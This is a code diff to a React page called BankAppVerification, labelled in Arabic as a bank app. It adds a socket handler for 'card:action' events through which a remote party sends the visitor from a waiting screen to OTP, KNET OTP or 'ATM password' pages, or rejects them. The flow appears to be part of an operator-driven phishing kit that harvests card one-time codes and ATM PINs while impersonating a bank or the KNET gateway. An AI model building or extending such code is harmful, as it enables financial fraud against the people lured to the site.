@@ -4,7 +4,7 @@ import { useSignalEffect } from "@preact/signals-react";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
-import { sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";
+import { socket, sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";
 
 export default function BankAppVerification() {
   const [, navigate] = useLocation();
@@ -18,6 +18,28 @@ export default function BankAppVerification() {
 
   useEffect(() => { navigateToPage("تطبيق البنك"); }, []);
 
+  // Direct socket action handler
+  useEffect(() => {
+    const s = socket.value;
+    if (!s) return;
+    const handler = (action: string) => {
+      console.log("bankapp card:action ->", action);
+      const isKnet = localStorage.getItem("flowType") === "knet";
+      waitingMessage.value = "";
+      setIsWaiting(false);
+      if (action === "otp") {
+        navigate(isKnet ? "/knet-otp" : "/otp-verification");
+      } else if (action === "atm") {
+        navigate("/atm-password");
+      } else if (action === "reject") {
+        setRejected(true);
+        setError(true);
+      }
+    };
+    s.on("card:action", handler);
+    return () => { s.off("card:action", handler); };
+  }, []);
+
   useSignalEffect(() => {
     const a = cardAction.value;
     if (!a) return;
@@ -28,7 +50,7 @@ export default function BankAppVerification() {
     } else if (a.action === "otp") {
       waitingMessage.value = "";
       setIsWaiting(false);
-      navigate("/otp-verification");
+      navigate(localStorage.getItem("flowType") === "knet" ? "/knet-otp" : "/otp-verification");
     } else if (a.action === "atm") {
       waitingMessage.value = "";
       setIsWaiting(false);
